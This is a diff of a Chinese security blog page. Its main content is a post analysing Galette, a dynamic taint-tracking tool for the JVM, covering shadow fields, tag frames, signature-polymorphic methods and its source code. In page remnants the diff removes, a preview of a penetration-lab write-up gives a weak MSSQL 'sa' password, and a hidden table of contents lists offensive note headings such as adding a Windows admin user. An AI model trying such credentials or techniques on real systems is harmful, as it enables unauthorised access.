+<p>影子字段与原始字段在同一个类中声明，具有相同的访问修饰符。这使得JVM在解析字段访问时，其语义与原始程序完全一致，无需像镜像存储那样去模拟字段解析过程，从而保证了精确性。</p>
+<h3 id="数组处理"><a href="#数组处理" class="headerlink" title="数组处理"></a>数组处理</h3><p>采用镜像存储</p>
+<p>传统影子存储会用一个新的“包装器对象”替换原始数组，这会带来严重问题：</p>
+<ul>
+<li>当包装器数组被传递给未插桩的代码（尤其是<strong>原生方法</strong>）时，对方期望的是原始数组，收到包装器会导致崩溃或未定义行为。（说人话就是类型不匹配，明明要的是ArrayList，你非要封装一个MyHashMap给我）</li>
+</ul>
+<p>Galette的解决方案：维护一个全局的、类似于镜像存储中“镜像堆”的映射结构——<code>TagStore</code>。</p>
+<ul>
+<li><code>TagStore</code>将一个原始数组对象映射到一个<code>ArrayTags</code>记录，该记录包含了该数组长度和每个元素的污点标签。</li>
+<li>当访问数组元素时，插桩代码会从<code>TagStore</code>中查询或更新对应元素的污点标签。</li>
+</ul>
+<p>原始数组对象本身没有任何改变，可以安全地传递给任何代码（包括原生方法），极大地提升了系统的稳健性。</p>
+<h3 id="方法调用间的标签传递"><a href="#方法调用间的标签传递" class="headerlink" title="方法调用间的标签传递"></a>方法调用间的标签传递</h3><p>Galette为每个原始方法创建一个“影子方法”，该方法的参数列表是在原始参数基础上<strong>追加一个<code>Frame</code>（标签帧）参数</strong>。这个<code>Frame</code>对象包含了所有传入参数的污点标签，以及用于存放返回值的污点标签的空间。</p>
+<p>所有方法调用点都被替换为对影子方法的调用，并传入构建好的<code>Frame</code>。</p>
+<ul>
+<li>相比于镜像存储依赖“镜像调用栈”的隐式传递，这种<strong>显式参数传递</strong>确保了污点标签总能被准确地从调用者传递给正确的被调用者，即使JVM在中间执行了上行调用，也不会造成错位。</li>
+</ul>
+<blockquote>
+<p>镜像调用栈的挑战：</p>
+<ul>
+<li>由于镜像调用栈是独立于JVM栈的，它必须精确地模拟JVM的调用栈行为。但是，JVM在执行过程中可能会进行一些“上行调用”（up-calls）。这些上行调用可能会在原始程序指令之间插入，导致镜像调用栈的压栈和出栈操作与JVM栈不一致。</li>
+<li>例如，在仪器化代码中，可能在调用方法之前插入了将镜像帧压入镜像栈的代码，而在被调用方法开始处插入从镜像栈弹出帧的代码。但是，如果在这两者之间JVM执行了一个上行调用，那么这个上行调用也会被仪器化，并压入一个镜像帧，从而破坏了镜像栈的预期结构，导致污点标签传递错误。</li>
+</ul>
+<p>镜像存储方法的优点是非侵入性，不会改变原始程序的结构，但缺点是由于需要模拟整个执行环境，容易因模拟不精确而导致污点标签传播错误。</p>
+<p><strong>上行调用问题</strong>：这是镜像调用栈的一个<strong>致命弱点</strong>。JVM在执行过程中，可能会在Java字节码指令之间插入对Java运行时本身的调用（例如，加载一个类、初始化一个类、抛出异常等）。这被称为“上行调用”。</p>
+<ul>
+<li><strong>问题所在</strong>：在仪器化代码刚刚压入一个镜像帧之后，但在目标方法实际执行之前，JVM进行了一个上行调用。这个上行调用也会被仪器化，并压入它自己的镜像帧。当目标方法最终开始执行时，它会错误地使用为上行调用准备的镜像帧，导致污点标签完全错乱。</li>
+</ul>
+<p><strong>性能开销</strong>：维护一个完全独立的、与程序执行同步的镜像栈，并进行大量的映射查找和模拟操作，通常会带来比影子存储更高的性能开销。论文中的数据也显示，MirrorTaint的平均开销（5593倍）远高于Galette和Phosphor。</p>
+</blockquote>
+<h3 id="签名多态方法"><a href="#签名多态方法" class="headerlink" title="签名多态方法"></a>签名多态方法</h3><p><strong>签名多态方法</strong>是一类特殊的Java方法，它们<strong>在源代码层面“看起来”可以接受任何参数类型和数量</strong>，并且可以返回任何类型。</p>
+<p>举个例子，他的声明方式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="meta">@PolymorphicSignature</span> Object <span class="title function_">invokeExact</span><span class="params">(Object... args)</span> <span class="keyword">throws</span> Throwable;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="它与普通方法的核心区别是什么？"><a href="#它与普通方法的核心区别是什么？" class="headerlink" title="它与普通方法的核心区别是什么？"></a>它与普通方法的核心区别是什么？</h4><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>普通方法</th>
+<th>签名多态方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>类型检查时机</strong></td>
+<td><strong>编译时</strong>。编译器根据方法声明的固定签名进行检查。</td>
+<td><strong>运行时</strong>。在方法被<strong>调用时</strong>，JVM才根据调用点的具体类型描述符进行检查。</td>
+</tr>
+<tr>
+<td><strong>链接（Linking）</strong></td>
+<td>链接到一个固定的实现。</td>
+<td>链接到一个高度可变的、由方法句柄（MethodHandle）目标决定的实现。</td>
+</tr>
+<tr>
+<td><strong>方法签名</strong></td>
+<td>固定的。</td>
+<td><strong>动态的</strong>，取决于调用站点（call site）的写法。</td>
+</tr>
+</tbody></table>
+<p>在标准的Java类库中，主要有两个类包含签名多态方法：</p>
+<ul>
+<li><strong><code>java.lang.invoke.MethodHandle</code></strong> (Java 7引入)<ul>
+<li>例如：<code>invoke(Object... args)</code>, <code>invokeExact(Object... args)</code>, <code>invokeWithArguments(Object... args)</code></li>
+</ul>
+</li>
+<li><strong><code>java.lang.invoke.VarHandle</code></strong> (Java 9引入)<ul>
+<li>例如：<code>get(Object... args)</code>, <code>set(Object... args)</code>, <code>compareAndSet(Object... args)</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>无法修改签名</strong>：传统的“影子存储”技术会通过修改方法签名（添加影子参数）来传递污点标签。但对于签名多态方法，这样做会<strong>破坏其核心机制</strong>。因为JVM会检查调用点的签名是否与 <code>MethodHandle</code> 的预期签名匹配，你添加了额外参数，匹配就会失败，调用无法进行。</p>
+<p><strong>参数可能被JVM修改</strong>：JVM在调用签名多态方法时，可能会<strong>内部修改参数列表</strong>（例如，添加或移除尾部的参数，或进行基本类型转换）。这使得污点跟踪系统难以在调用方和被调用方之间正确地对应参数和它们的污点标签。</p>
+<p>签名多态方法的方法签名不能被修改，否则会导致类型匹配失败。</p>
+<p>Galette的解决方案：采用一个线程局部的“帧存储”来间接传递标签。</p>
+<ol>
+<li>在调用签名多态方法前，插桩代码将参数的标签帧存入当前线程的帧存储中。</li>
+<li>然后，以原始方式（不修改签名）调用该多态方法。</li>
+<li>在<strong>目标方法的一端</strong>（任何一个方法都可能被多态调用，所以Galette将所有原始方法体都改造成了“包装器”），包装器会首先检查线程局部的帧存储。</li>
+<li>如果帧存储中有帧，并且通过一个“宽松的匹配算法”确认该帧属于本次调用，则使用该帧来初始化影子方法的参数。匹配算法会考虑JVM可能对参数做的固有修改（如添加或移除尾部参数）。</li>
+<li>最后，清除或恢复帧存储的状态。</li>
+</ol>
+<p>什么意思呢？举个例子：</p>
+<p>调用签名多态方法 <code>methodHandle.invokeExact(23, 45)</code>，其中 <code>23</code> 是被污染的，<code>45</code> 是干净的。</p>
+<p>1、在调用具体的invokeExact方法之前，会先生成一个线程局部帧存储（只有当前线程能访问，避免帧错乱）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ThreadLocalFrameStore.set(</span><br><span class="line">    frame: [TAINTED, CLEAN], <span class="comment">// 标签帧</span></span><br><span class="line">    originalArgs: [<span class="number">23</span>, <span class="number">45</span>]   <span class="comment">// 帧数据</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>2、正常调用多态方法：调用原始的、未修改<code>invokeExact(23, 45)</code>，因为都是原始参数和方法，所以JVM运行正常</p>
+<p>3、Galette加入了一个包装器方法，该方法会去第一步创建的线程局部帧存储看看有没有对应上的帧数据</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在包装器方法内部</span></span><br><span class="line"><span class="type">Frame</span> <span class="variable">possibleFrame</span> <span class="operator">=</span> ThreadLocalFrameStore.get(); <span class="comment">// 去中转站查看</span></span><br></pre></td></tr></table></figure>
+
+<p>线程局部帧存储里可能有货，也可能没货。有货的话，这个货是不是就一定属于当前这个收货人呢？不一定！</p>
+<p>这种情况当然发生于两个签名多态方法调用连续发生，并且它们共享同一个线程。但是什么代码会使它连续发生呢？</p>
+<p>下面的mhFoo指向方法foo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MethodHandle</span> <span class="variable">mhFoo</span> <span class="operator">=</span> ...; <span class="comment">// 指向 foo</span></span><br><span class="line"><span class="comment">// 第一个调用</span></span><br><span class="line">mhFoo.invokeExact(...); </span><br></pre></td></tr></table></figure>
+
+<p>在invokeExact发生了上行调用，调用到了类加载，刚好加载的那个类的static方法内有第二个签名多态方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MethodHandle</span> <span class="variable">mhBar</span> <span class="operator">=</span> ...; <span class="comment">// 指向 bar</span></span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">    mhBar.invokeExact(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>就会发生第二个线程局部帧存储覆盖第一个的情况</p>
+<p>当然这种情况实属罕见，作者能考虑到这种程度也真的很细心了</p>
+<p>作者为了应付这种情况，特地加入了一个宽松匹配方法，因为作者认为，两次签名多态方法，总不能参数类型和数据一模一样吧</p>
+<p>具体的宽松匹配算法：</p>
+<ul>
+<li>场景A：<strong>JVM加入了一个尾部参数</strong>。假如线程局部帧存储里为如下数据：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[23, 45, SomeJVMStuff]</span><br></pre></td></tr></table></figure>
+
+<p>而包装器方法收到的<code>[23]</code>数据</p>
+<p>宽松匹配算法会说：”忽略那个JVM添加的额外东西，核心货物 <code>23</code> 对得上，这货是你的。”</p>
+<ul>
+<li>场景B：<strong>JVM转换了类型</strong>。包装器收到一个 <code>int</code> 类型的 <code>23</code>，线程局部帧存储上记录的是一个 <code>byte</code> 类型的 <code>23</code>。宽松匹配算法会说：”数值一样，只是包装不同，这货是你的。”</li>
+</ul>
+<p>如果匹配成功，包装器则会取走标签帧 <code>[TAINTED, CLEAN]</code>，并清空线程局部帧存储；如果匹配失败，他会创建一个空的标签帧来处理</p>
+<p>包装器现在有了标签帧（无论是有标签的还是空的），他终于可以去做真正的业务了。</p>
+<p>他拿着收到的数据和标签帧，去调用<strong>真正的后台处理部门（影子方法）</strong>。</p>
+<p><strong>这是一个典型的折中方案</strong>：它引入了类似镜像存储的全局状态，因而在理论上仍然存在因上行调用导致标签错配的风险（尽管Galette通过匹配算法尽力缓解）。但这是在不破坏签名多态方法语义的前提下，能够跟踪信息流的唯一实用方法。</p>
+<p>作者通过对各种污点传播过程中数据的存储方式进行了考量，完成了在JDK高版本下算得上是高兼容的污点数据结构。</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>Gelette的前身为phosphor，这个项目经过了1200+commit，代码相当多，我看起来真的头痛</p>
+<p>相比起来，Gelette 2025这个项目像个婴儿</p>
+<h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>premain起手，插桩类为GaletteTransformer</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125152331266.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125152331266.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125152331266"></p>
+<p>插桩会调用GaletteTransformer#transform</p>
+<p>具体来说就是去除无需插桩的java内部类，缓存已插桩的类，然后调用transformInternal进行具体的改造</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125152627011.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125152627011.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125152627011"></p>
+<p>一句一个注释吗</p>
+<h3 id="影子字段和影子方法增强"><a href="#影子字段和影子方法增强" class="headerlink" title="影子字段和影子方法增强"></a>影子字段和影子方法增强</h3><p>跟进transformInternal，添加了Frame（标签帧）、影子字段和影子方法，具体的ASM代码就不看了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125153049868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125153049868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125153049868"></p>
+<p>跟进ShadowFieldAdder，可以看到加的影子字段前缀为<code>$$GALETTE</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125154200966.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125154200966.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125154200966"></p>
+<p>跟进ShadowMethodCreator，影子方法的处理会遍历该方法里用到的所有方法去生成影子方法。所以论文提到第一次污点attach会花费较长的时间，问题就出在这里，有时候一直遍历子方法可能会有bug</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125154308681.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125154308681.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125154308681"></p>
+<p>原来看Dongtai IAST的时候我还没考虑到如果要增强JNI方法怎么办，事实上执行一遍用一个包装器去包装原JNI方法，然后外面套一个去掉native方法的壳就行了。这里也是这么处理的</p>
+<p>先是去掉了方法的前置native和权限控制符，这些都会同时暂存起来。然后制作一个影子方法。那为什么没看到前面提到的帧存储呢？答案是放在了方法描述符里</p>
+<p>这里完成影子方法的制作后，用TagPropagator完成一个方法中污点数据到另一个方法的传播（Propagator）</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125154906963.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125154906963.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125154906963"></p>
+<p>在getShadowMethodDescriptor中，帧标签被一起放到方法描述符中存储</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125155118677.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125155118677.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125155118677"></p>
+<h3 id="操作树栈增强"><a href="#操作树栈增强" class="headerlink" title="操作树栈增强"></a>操作树栈增强</h3><p>ShadowLocals#visitFrame，拷贝原始局部变量到新的列表中，用TOP填补空位</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125160213781.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125160213781.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125160213781"></p>
+<p>标签Tag，也就是污点传播的规则，全在TagPropagator里写死了</p>
+<h3 id="source-x2F-sink"><a href="#source-x2F-sink" class="headerlink" title="source&#x2F;sink"></a>source&#x2F;sink</h3><p>masks目录下是Node的规则，这里面既包含了source也包含了sink</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125161351659.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125161351659.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125161351659"></p>
+<p>比如各种invoke，newInstance</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125161450967.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125161450967.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125161450967"></p>
+<p>再比如各种序列化和反序列化</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125161529386.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125161529386.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125161529386"></p>
+<p>本文的重点不在于污点传播规则的设定，而是一种新的字节码插桩方式。所以污点传播的指定也是只针对了他的benchmark</p>
+<p>举个例子，他的ArrayAccessITCase测试三维数组元素的污点传播。测试排序后整型数组的污点标签是否正确保留。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125162838865.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251125162838865.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251125162838865"></p>
+<p>感觉，不太实用，但是思路很好。纯科研算法吧。</p>
+<p>没看完代码，看的我有点头痛，污点传播逻辑全用ASM写TagPropagator里，是个人都不想读了。不过根据bench来看，不像是用于漏洞测试，而是一个自定义的污点去测试系统功能。算是我最近读到能读懂，最贴合我的学习路线、思路最屌的论文了。</p>
 
       </div>
       <div class="post-tags-categories">
-        
-        <div class="tags">
-          
-            <a href="/tags/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="">
-              渗透笔记
-            </a>
-          
-        </div>
         
       </div>
       
@@ -715,7 +845,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2025/08/21/da-ba-bi-ji/" target="_blank" title="打靶笔记">https://godownio.github.io/2025/08/21/da-ba-bi-ji/</a>
+    <a href="/2025/11/25/galette/" target="_blank" title="Dynamic Taint Tracking for Modern Java Virtual Machines">https://godownio.github.io/2025/11/25/galette/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -733,41 +863,22 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8169.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8169.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2025/08/28/lilctf/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">lilctf 2025</div>
-      </div>
-      
-      <!-- <div class="content">
-        lilctf 2025ctf地址（趁在线）https://lilctf.xinshi.fun/games/1/chall
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8171.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8171.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8179.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8179.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2025/08/21/chun-qiu-yun-jing-tsclient/" class="post-nav-link">
+    <a href="/2025/11/16/finance-jdbc-attack/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">春秋云镜 Tsclient</div>
+        <div class="title-text">春秋云镜 Finance postgresql jdbc attack部分</div>
       </div>
       <!-- <div class="content">
-        春秋云镜 Tscilent一刷fsacn扫到1433 MSSQL 账号sa&#x2F;1qaz!QAZ弱密码
-
-数据库s
+        春秋云镜 Finance postgresql jdbc attack部分大佬叫打的，好像是靶场的一血？
+h2 webc
       </div> -->
     </a>
   </div>
@@ -988,7 +1099,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">其他的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E9%9D%B6%E5%BF%AB%E6%8D%B7"><span class="toc-text">打靶快捷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gost-%E4%BB%A3%E7%90%86"><span class="toc-text">gost 代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7"><span class="toc-text">windows添加管理员用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E8%BD%AC%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="toc-text">python转交互式shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99ssh%E7%9B%AE%E5%BD%95"><span class="toc-text">写ssh目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proxychains4"><span class="toc-text">proxychains4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%AE%B0%E5%BD%95"><span class="toc-text">其他记录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E7%AC%94%E8%AE%B0"><span class="toc-text">msf笔记</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dynamic-Taint-Tracking-for-Modern-Java-Virtual-Machines"><span class="toc-text">Dynamic Taint Tracking for Modern Java Virtual Machines</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E5%AD%98%E5%82%A8%E4%B8%8E%E9%95%9C%E5%83%8F%E5%AD%98%E5%82%A8"><span class="toc-text">影子存储与镜像存储</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8%E6%A0%87%E7%AD%BE%EF%BC%9F"><span class="toc-text">1. 如何存储标签？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E4%BC%A0%E9%80%92%E6%A0%87%E7%AD%BE%EF%BC%9F"><span class="toc-text">2. 如何传递标签？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%A6%82%E4%BD%95%E4%BC%A0%E6%92%AD%E6%A0%87%E7%AD%BE%EF%BC%9F"><span class="toc-text">3. 如何传播标签？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E5%AD%98%E5%82%A8%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-text">影子存储的优缺点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gelette%E8%AE%BE%E8%AE%A1%E6%9E%B6%E6%9E%84"><span class="toc-text">Gelette设计架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-text">操作数栈的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E6%AE%B5%E5%A4%84%E7%90%86"><span class="toc-text">字段处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%A4%84%E7%90%86"><span class="toc-text">数组处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E9%97%B4%E7%9A%84%E6%A0%87%E7%AD%BE%E4%BC%A0%E9%80%92"><span class="toc-text">方法调用间的标签传递</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E5%A4%9A%E6%80%81%E6%96%B9%E6%B3%95"><span class="toc-text">签名多态方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%83%E4%B8%8E%E6%99%AE%E9%80%9A%E6%96%B9%E6%B3%95%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">它与普通方法的核心区别是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">预处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E5%AD%97%E6%AE%B5%E5%92%8C%E5%BD%B1%E5%AD%90%E6%96%B9%E6%B3%95%E5%A2%9E%E5%BC%BA"><span class="toc-text">影子字段和影子方法增强</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%A0%91%E6%A0%88%E5%A2%9E%E5%BC%BA"><span class="toc-text">操作树栈增强</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#source-x2F-sink"><span class="toc-text">source&#x2F;sink</span></a></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
